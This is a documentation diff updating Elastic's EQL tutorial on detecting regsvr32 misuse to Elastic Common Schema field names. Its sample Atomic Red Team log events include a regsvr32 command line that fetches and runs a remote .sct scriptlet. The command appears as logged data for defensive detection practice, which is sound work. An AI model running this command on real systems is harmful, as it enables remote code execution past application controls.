@@ -9,18 +9,20 @@ This example tutorial shows you how you can use EQL to detect security threats
 and other suspicious behavior.
 
 In the scenario, you're tasked with detecting
-https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows Event Logs.
-Regsvr32 misuse is a known adversary technique
-documented in the https://attack.mitre.org[MITRE ATT&CK®] knowledge base.
+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event
+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is
+a known adversary technique documented in the https://attack.mitre.org[MITRE
+ATT&CK®] knowledge base.
 
 [discrete]
 [[eql-ex-threat-detection-setup]]
 === Setup
 
-This tutorial uses a normalized test dataset for regsvr32 misuse from
-https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset
-includes events that imitate behaviors related to regsvr32 misuse, as documented
-by MITRE ATT&CK®.
+This tutorial uses a test dataset for regsvr32 misuse from
+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has
+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The
+dataset includes events that imitate behaviors related to regsvr32 misuse, as
+documented by MITRE ATT&CK®.
 
 To get started, download and index the dataset:
 
@@ -62,7 +64,7 @@ Since you're looking for `regsvr32` misuse, start by getting a count of events
 using `regsvr32.exe`.
 
 The following <<eql-search-api,EQL search API>> request uses an EQL query to
-retrieve a count of events with a `process_name` of `regsvr32.exe`. The query
+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query
 starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,
 meaning the query can match events of any <<eql-required-fields,event
 category>>.
@@ -72,11 +74,9 @@ category>>.
 GET /sec_logs/_eql/search?filter_path=-hits.events  <1>
 {
   "query": """
-    any where process_name == "regsvr32.exe"        <2>
+    any where process.name == "regsvr32.exe"        <2>
   """,
-  "event_category_field": "event_type",             <3>
-  "timestamp_field": "timestamp",                   <4>
-  "size": 150                                       <5>
+  "size": 150                                       <3>
 }
 ----
 // TEST[setup:sec_logs]
@@ -85,10 +85,8 @@ GET /sec_logs/_eql/search?filter_path=-hits.events  <1>
 `hits.events` property from the response. The `hits.events` property contains
 the document source for any matching events. This request is intended to
 retrieve a count of events only.
-<2> Uses an EQL query to match events with a `process_name` of `regsvr32.exe`.
-<3> Sets the event category field as `event_type`.
-<4> Sets the timestamp field as `timestamp`.
-<5> Returns up to 150 events or sequences matching the EQL query.
+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.
+<3> Returns up to 150 events or sequences matching the EQL query.
 
 The request returns the following response, indicating that 143 events match the
 query.
@@ -118,8 +116,9 @@ Your previous query matched 143 events. Many of these events are likely to be
 false positives.
 
 To narrow down the results, check if the command line was used during any of
-these events. Append `and command_line > 0` to the previous EQL query. This
-limits matching results to events that contain a `command_line` value.
+these events. Append `and process.command_line > 0` to the previous EQL query.
+This limits matching results to events that contain a `process.command_line`
+value.
 
 You'll also need to remove the `filter_path=-hits.events` query parameter. This
 lets you retrieve the document source for any matching events.
@@ -129,25 +128,23 @@ lets you retrieve the document source for any matching events.
 GET /sec_logs/_eql/search
 {
   "query": """
-    any where process_name == "regsvr32.exe" and command_line > 0
+    any where process.name == "regsvr32.exe" and process.command_line > 0
   """,
-  "event_category_field": "event_type",
-  "timestamp_field": "timestamp",
   "size": 150
 }
 ----
 // TEST[setup:sec_logs]
 
-The query matches one event. Based on the event's `command_line` value,
+The query matches one event. Based on the event's `process.command_line` value,
 `regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known
-https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] behavior.
+regsvr32 misuse behavior.
 
 [source,console-result]
 ----
 {
   "is_partial": false,
   "is_running": false,
-  "took": 2,
+  "took": 21,
   "timed_out": false,
   "hits": {
     "total": {
@@ -160,22 +157,30 @@ https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] behavior.
         "_id": "gl5MJXMBMk1dGnErnBW8",
         "_score": null,
         "_source": {
-          "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
-          "event_type": "process",
+          "process": {
+            "parent": {
+              "name": "cmd.exe",
+              "entity_id": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
+              "executable": "C:\\Windows\\System32\\cmd.exe"
+            },
+            "name": "regsvr32.exe",
+            "pid": 2012,
+            "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+            "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+            "executable": "C:\\Windows\\System32\\regsvr32.exe",
+            "ppid": 2652
+          },
           "logon_id": 217055,
-          "parent_process_name": "cmd.exe",
-          "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
-          "pid": 2012,
-          "ppid": 2652,
-          "process_name": "regsvr32.exe",
-          "process_path": "C:\\Windows\\System32\\regsvr32.exe",
-          "subtype": "create",
-          "timestamp": 131883573237130000,
-          "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
-          "unique_ppid": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
-          "user": "ART-DESKTOP\\bob",
-          "user_domain": "ART-DESKTOP",
-          "user_name": "bob"
+          "@timestamp": 131883573237130000,
+          "event": {
+            "category": "process",
+            "type": "create"
+          },
+          "user": {
+            "full_name": "bob",
+            "domain": "ART-DESKTOP",
+            "id": "ART-DESKTOP\\bob"
+          }
         },
         "sort": [
           131883573237130000
@@ -185,7 +190,7 @@ https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] behavior.
   }
 }
 ----
-// TESTRESPONSE[s/"took": 2/"took": $body.took/]
+// TESTRESPONSE[s/"took": 21/"took": $body.took/]
 // TESTRESPONSE[s/"_id": "gl5MJXMBMk1dGnErnBW8"/"_id": $body.hits.events.0._id/]
 
 [discrete]
@@ -198,20 +203,18 @@ later load the `scrob.dll` file.
 
 Modify the previous EQL query as follows:
 
-* Change the `any` keyword to `image_load`. This means the query only matches
-events with an `event_type` of `image_load`.
-* Add the `image_name == "scrobj.dll` condition to check for image loads of
-`scrobj.dll`.
+* Change the `any` keyword to `file`. This means the query only matches
+events with an `event.category` of `file`.
+* Add the `file.name == "scrobj.dll` condition to check for loads of
+the `scrobj.dll` file.
 
 [source,console]
 ----
 GET /sec_logs/_eql/search
 {
   "query": """
-    image_load where process_name == "regsvr32.exe" and image_name == "scrobj.dll"
+    file where process.name == "regsvr32.exe" and file.name == "scrobj.dll"
   """,
-  "event_category_field": "event_type",
-  "timestamp_field": "timestamp",
   "size": 150
 }
 ----
@@ -238,14 +241,20 @@ The query matches an event, confirming that `scrobj.dll` was later loaded by
         "_id": "ol5MJXMBMk1dGnErnBW8",
         "_score": null,
         "_source": {
-          "event_type": "image_load",
-          "image_name": "scrobj.dll",
-          "image_path": "C:\\Windows\\System32\\scrobj.dll",
-          "pid": 2012,
-          "process_name": "regsvr32.exe",
-          "process_path": "C:\\Windows\\System32\\regsvr32.exe",
-          "timestamp": 131883573237450016,
-          "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}"
+          "process": {
+            "name": "regsvr32.exe",
+            "pid": 2012,
+            "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+            "executable": "C:\\Windows\\System32\\regsvr32.exe"
+          },
+          "file": {
+            "path": "C:\\Windows\\System32\\scrobj.dll",
+            "name": "scrobj.dll"
+          },
+          "@timestamp": 131883573237450016,
+          "event": {
+            "category": "file"
+          }
         },
         "sort": [
           131883573237450016
@@ -270,24 +279,22 @@ events, in order:
 
 . A `regsvr32.exe` process, which could have been used to register malicious
 scripts as `scrobj.dll`
-. An image load of the `scrobj.dll` file
+. A load of the `scrobj.dll` file
 . Any network event, which could indicate the download of a remote file
 
-To match, each event in the sequence must share the same `pid` (process ID)
-field value.
+To match, each event in the sequence must share the same `process.pid` (process
+ID) field value.
 
 [source,console]
 ----
 GET /sec_logs/_eql/search
 {
   "query": """
-    sequence by pid
-      [process where process_name == 'regsvr32.exe']
-      [image_load where image_name == 'scrobj.dll']
+    sequence by process.pid
+      [process where process.name == 'regsvr32.exe']
+      [file where file.name == 'scrobj.dll']
       [network where true]
   """,
-  "event_category_field": "event_type",
-  "timestamp_field": "timestamp",
   "size": 150
 }
 ----
@@ -318,22 +325,30 @@ The query matches a sequence, indicating the attack likely succeeded.
             "_id": "gl5MJXMBMk1dGnErnBW8",
             "_score": null,
             "_source": {
-              "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
-              "event_type": "process",
+              "process": {
+                "parent": {
+                  "name": "cmd.exe",
+                  "entity_id": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
+                  "executable": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "name": "regsvr32.exe",
+                "pid": 2012,
+                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+                "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+                "executable": "C:\\Windows\\System32\\regsvr32.exe",
+                "ppid": 2652
+              },
               "logon_id": 217055,
-              "parent_process_name": "cmd.exe",
-              "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
-              "pid": 2012,
-              "ppid": 2652,
-              "process_name": "regsvr32.exe",
-              "process_path": "C:\\Windows\\System32\\regsvr32.exe",
-              "subtype": "create",
-              "timestamp": 131883573237130000,
-              "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
-              "unique_ppid": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
-              "user": "ART-DESKTOP\\bob",
-              "user_domain": "ART-DESKTOP",
-              "user_name": "bob"
+              "@timestamp": 131883573237130000,
+              "event": {
+                "category": "process",
+                "type": "create"
+              },
+              "user": {
+                "full_name": "bob",
+                "domain": "ART-DESKTOP",
+                "id": "ART-DESKTOP\\bob"
+              }
             },
             "sort": [
               131883573237130000
@@ -344,14 +359,20 @@ The query matches a sequence, indicating the attack likely succeeded.
             "_id": "ol5MJXMBMk1dGnErnBW8",
             "_score": null,
             "_source": {
-              "event_type": "image_load",
-              "image_name": "scrobj.dll",
-              "image_path": "C:\\Windows\\System32\\scrobj.dll",
-              "pid": 2012,
-              "process_name": "regsvr32.exe",
-              "process_path": "C:\\Windows\\System32\\regsvr32.exe",
-              "timestamp": 131883573237450016,
-              "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}"
+              "process": {
+                "name": "regsvr32.exe",
+                "pid": 2012,
+                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+                "executable": "C:\\Windows\\System32\\regsvr32.exe"
+              },
+              "file": {
+                "path": "C:\\Windows\\System32\\scrobj.dll",
+                "name": "scrobj.dll"
+              },
+              "@timestamp": 131883573237450016,
+              "event": {
+                "category": "file"
+              }
             },
             "sort": [
               131883573237450016
@@ -362,21 +383,33 @@ The query matches a sequence, indicating the attack likely succeeded.
             "_id": "EF5MJXMBMk1dGnErnBa9",
             "_score": null,
             "_source": {
-              "destination_address": "151.101.48.133",
-              "destination_port": "443",
-              "event_type": "network",
-              "pid": 2012,
-              "process_name": "regsvr32.exe",
-              "process_path": "C:\\Windows\\System32\\regsvr32.exe",
-              "protocol": "tcp",
-              "source_address": "192.168.162.134",
-              "source_port": "50505",
-              "subtype": "outgoing",
-              "timestamp": 131883573238680000,
-              "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
-              "user": "ART-DESKTOP\\bob",
-              "user_domain": "ART-DESKTOP",
-              "user_name": "bob"
+              "process": {
+                "name": "regsvr32.exe",
+                "pid": 2012,
+                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+                "executable": "C:\\Windows\\System32\\regsvr32.exe"
+              },
+              "destination": {
+                "address": "151.101.48.133",
+                "port": "443"
+              },
+              "source": {
+                "address": "192.168.162.134",
+                "port": "50505"
+              },
+              "network": {
+                "protocol": "tcp"
+              },
+              "@timestamp": 131883573238680000,
+              "event": {
+                "category": "network",
+                "type": "outgoing"
+              },
+              "user": {
+                "full_name": "bob",
+                "domain": "ART-DESKTOP",
+                "id": "ART-DESKTOP\\bob"
+              }
             },
             "sort": [
               131883573238680000
